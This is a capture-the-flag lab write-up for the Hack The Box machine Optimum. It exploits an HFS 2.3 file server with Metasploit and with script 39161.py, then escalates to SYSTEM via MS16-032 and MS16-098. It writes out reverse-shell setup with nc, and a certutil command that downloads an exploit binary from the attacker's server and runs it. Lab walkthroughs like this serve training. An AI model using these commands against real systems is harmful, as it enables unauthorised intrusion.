# Optimum - HTB

Optimum - 10.10.10.8

![](/images/optimum/1. optimum.png "Optimum Info Card")

Contents:

1. TOC
{:toc}

<p>&nbsp;</p>
=======================================================

## Introduction

=======================================================

Optimum is an early, easy 64-bit Windows machine on the Hack the Box platform, released in early 2017.

<p>&nbsp;</p>
=======================================================

## Tools & Techniques Used

=======================================================

Optimum presents a vulnerable file server which we can exploit to gain initial access. From there, we have multiple options to escalate privileges to system level. Our chosen metasploit privesc module requires a payload tweak from the default setting, and during maual exploitation we will work with native (certutil.exe) and non-native (nc.exe) Windows binaries to achieve success.

-1- nmap

-2- msf module: exploit/windows/http/rejetto_hfs_exec

-3- msf module: post/multi/recon/local_exploit_suggester

-4- msf module: exploit/windows/local/ms16_032_secondary_logon_handle_privesc (payload tweak)

-5- python scripting 39161.py

-6- nc & nc.exe

-7- windows-exploit-suggester.py

-8- MS16-098 privesc

-9- certutil

<p>&nbsp;</p>
=======================================================

## Scanning and Enumeration

=======================================================

We start with a simple nmap command to enumerate open ports and services:

    nmap -A -T4 10.10.10.8

![](/images/optimum/2. nmap.png)

Port 80 is open and that's it.  Looks like HFS version 2.3.  So let's visit the website in a browser.

![](/images/optimum/3. website.png)

We see what look's like a file server: HFS 2.3.

    searchsploit HFS

![](/images/optimum/4. searchsploit.png)

Looks like we have at least one exploit that is a python script: 39161.py for HFS versions 2.3.x and also a Metasploit module 34926.rb. 

Google will also confirm this:

[https://www.exploit-db.com/exploits/39161](https://www.exploit-db.com/exploits/39161)

[https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec](https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec)

These look like the 39161.py file and the 34926.rb module we saw in searchsploit, so we should be good to go. From the Rapid7 site:

![](/images/optimum/5. rapid7.png)

Let's fire up Metasploit and get to work!

    msfconsole

<p>&nbsp;</p>
=======================================================

## Exploitation using Metasploit

=======================================================

In msfconsole:

    search HFS

![](/images/optimum/6. search.png)

The first option returned is for git, so not ours. We want the second one:

    use 1

    info

![](/images/optimum/7. info.png)
![](/images/optimum/7. info_2.png)

Several options here, but if you read through carefully, we should be able to provide the RHOSTS of 10.10.10.8 and gain a shell, everything else we know about this target is default (port 80, TARGETURI, etc).

    set rhosts 10.10.10.8

    run

    getuid

![](/images/optimum/8. run.png)

    sysinfo

![](/images/optimum/9. sysinfo.png)

We have a meterpreter shell as the user kostas and we are on a Windows 2012 R2, 64-bit machine. Let's drop to a cmd.exe shell and see if we can get the user flag before enumerating more for privesc:

    shell

    dir

    type user.txt.txt

    systeminfo

![](/images/optimum/10. user_enum.png)
![](/images/optimum/10. user_enum_2.png)
![](/images/optimum/10. user_enum_3.png)
![](/images/optimum/10. user_enum_4.png)

So we have our user flag and the systeminfo confirmed some of the meterpreter sysinfo command: Windows Server 2012 R2 Standard, 64-bit machine, and a lot of hotfixes installed.

Background the meterpreter session, then search for our local exploit suggester: Ctrl+z

    search suggester

    use 0

![](/images/optimum/11. suggester.png)

Now let's look at our options and assign it to our meterpreter session:

    show options

    set session 1

    run

![](/images/optimum/12. options.png)
![](/images/optimum/13. run.png)

So out of 30 exploit checks we only have two possible results, that is because this module works best against 32-bit machines and not 64-bit machines. Our two options are: ms16_032 or bypassuac_eventvwr

Let's search to see if we can find MS16-032 in metasploit:

    search MS16-032

![](/images/optimum/14. search.png)

This exploit exists as a Metasploit module, however it is very finnicky and does not always work. Fortunately we can work through it. To start we will migrate our current low-privileged Meterpreter shell into a 64-bit process.  (This is best practice, but not required)

    ps

![](/images/optimum/15. ps.png)

(output trimmed)
![](/images/optimum/15. ps_2.png)


At the bottom of the ps output we have x64 processes. Let's migrate to one of those, like explorer.exe

    migrate 2160

![](/images/optimum/16. migrate.png)

Now we background the meterpreter session and load up our local exploit module: Ctrl+z 

    search ms16-032

    use 0

![](/images/optimum/17. search.png)

Next we check out our options

    show options

    set session 2

    set target 1

![](/images/optimum/18. options.png)

Here we set our session to the meterpreter session we backgrounded, and then set our target to 1 for 64-bit. Show options again to confirm, then run!

    show options

    run

![](/images/optimum/19. run.png)

Note, the first time you run it, you may need to kill the session and then set lhost and lport. I've already done that in the below using the following commands:

    set lhost 10.10.14.24

    set lport 17012

![](/images/optimum/20. run_1.png)
![](/images/optimum/20. run_2.png)

For some reason, no matter how many times we try the exploit with these options, the session will not connect despite the exploit appearing to work (Holy handle leak Batman, we have a SYSTEM shell!!).

This indicates there may be something wrong with our payload so let's see if we can choose something else for our payload:

    show payloads

![](/images/optimum/21. payloads.png)

The default one that is working is number 2 on my list, “generic/shell_reverse_tcp”.  Number 25 on my list is “windows/x64/meterpreter_reverse_tcp”.  Let's try that one.

    set payload 25

![](/images/optimum/22. set.png)

Now before running it, let's see if there are any specific options to choose:
    show advanced options
   
![](/images/optimum/23. advanced.png)

(output trimmed)

![](/images/optimum/23. advanced_2.png)

There are a bunch of options here, but nothing additional we need to set.  Let's try to run it!

    run
    
    getuid

![](/images/optimum/24. run.png)
![](/images/optimum/24. run_2.png)
![](/images/optimum/24. run_3.png)

Success! We have a system level meterpreter shell. Now let's drop to a cmd.exe shell and get our flags:

    shell

    type C:\Users\kostas\Desktop\user.txt.txt

    type C:\Users\Administrator\Desktop\root.txt

![](/images/optimum/25. flags.png)

And here we have our two flags:
<p>&nbsp;</p>
=======================================================

## Manual Exploitation

=======================================================


For manual exploitation we will use the 39161.py python script listed by searchsploit. First, move it to your local directory so we can have a working copy:

    cp /usr/share/exploitdb/exploits/windows/remote/39161.py 39161.py

![](/images/optimum/26. 39161.png)

Next, gedit the script and let's see what we have:

![](/images/optimum/27. edit.png)

So we need to run a webserver with the nc.exe file in the same directory, and there is also a note stating we may need to run the script multiple times in order to achieve success. On Kali, we have a few pre-compiled nc.exe files. I chose: /usr/share/windows-resources/binaries/nc.exe. We copy this file into our local directory:

    cp /usr/share/windows-resources/binaries/nc.exe nc.exe

Now run python's simple web server:  

    python -m SimpleHTTPServer 80

![](/images/optimum/28. python.png)

Next we have a section of code to modify, adding our attacking machine's IP address and a port to listen on and catch a reverse nc.exe connection:
 
 ![](/images/optimum/29. modify.png)

Set up your nc listener to catch the callback:

    nc -lvnp 443
   
Run the python script in a separate terminal window:

    python 39161.py 10.10.10.8 80

![](/images/optimum/30. exploit.png)

Back in your listener window you should see the connection:

![](/images/optimum/31. nc_connection.png)

We are going to use the output from our systeminfo command and run it through Windows Exploit Suggester and wseng on our Kali linux machine.  

Copy all of the output from “systeminfo” and paste it into a txt file on your Kali linux machine. I call mine the htb machine name.sysinfo so “optimum.sysinfo” in this case:

![](/images/optimum/32. text.png)

Now we can copy this file to our directory with the Windows Exploit Suggester script. Mine is in /opt/scripts/Windows-Exploit-Suggester/

    cp optimum.systeminfo /opt/scripts/Windows-Exploit-Suggester/
    
    cd /opt/scripts/Windows-Exploit-Suggester/

First let's ensure we have up to date vulnerability definitions:

    ./windows-exploit-suggester.py -u

Next we can run the script against optimum.systeminfo:

    ./windows-exploit-suggester.py -i optimum.systeminfo -d 2020-05-07-mssb.xls

If you look at the options for windows-exploit-suggester.py, you may be tempted to use -l for local exploits only. Do not do so as you may miss out on some potential exploits to use (in this case, the one we are going to use will not show up if you use -l)

![](/images/optimum/33. wes.png)
![](/images/optimum/33. wes_2.png)

(output snipped)

We see several different options including the MS16-032 which we detected earlier. However, for this one we are going to use MS16-098, the second from the top of the list: [https://www.exploit-db.com/exploits/41020](https://www.exploit-db.com/exploits/41020)

Download the 41020.c code from the Exploit-db link above and store it as “41020.c”

Now we need to compile it using gcc:

    gcc 41020.c -o ex.exe

![](/images/optimum/34. gcc.png)

If you receive this error it means your gcc is not set up to cross-compile to Windows executables. That is normal for a default Kali Linux install. Instead, if you look in the 41020.c code, at the top is a comment with a link to a pre-compiled binary on github: [https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe](https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe)

Use wget to obtain the binary on your Kali machine:

    wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe

![](/images/optimum/35. wget.png)

Now we can transfer our 41020.exe file up to optimum using python's HTTP server on Kali and certutil on optimum:

    python -m SimpleHTTPServer 80

    certutil.exe -urlcache -f http://10.10.14.24/41020.exe 41020.exe

On Kali: 

![](/images/optimum/36. python.png)

On Optimum:

![](/images/optimum/37. certutil.png)

Now let's run 41020.exe and obtain a system shell!

    41020.exe

![](/images/optimum/38. 41020.png)

Success! Let's go get our flags:

![](/images/optimum/39. flags.png)

And there we have our flags.

<p>&nbsp;</p>
=======================================================

## Final Code

=======================================================

39161.py: [https://github.com/rax-register/code_examples/blob/master/39161.py](https://github.com/rax-register/code_examples/blob/master/39161.py)

41020.exe: [https://github.com/rax-register/code_examples/blob/master/41020.exe](https://github.com/rax-register/code_examples/blob/master/41020.exe)

<p>&nbsp;</p>
=======================================================

## Links & Additional Reading

=======================================================

1. CVE entry for HFS: [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6287](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6287)
2. Rapid7 msf module entry: [https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec](https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec)
3. MS16-032 entry (privesc): [https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032)
4. Exploit-db entry for exploit: [https://www.exploit-db.com/exploits/39161](https://www.exploit-db.com/exploits/39161)
5. MS16-098 entry (privesc): [https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-098](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-098)
6. Exploit-db entry for privesc: [https://www.exploit-db.com/exploits/41020](https://www.exploit-db.com/exploits/41020)
7. Pre-compiled privesc binary: [https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe](https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe)
8. certutil manual: [https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)

<p>&nbsp;</p>
=======================================================

![rax logo](/images/rax_intel.png)

<p>&nbsp;</p>
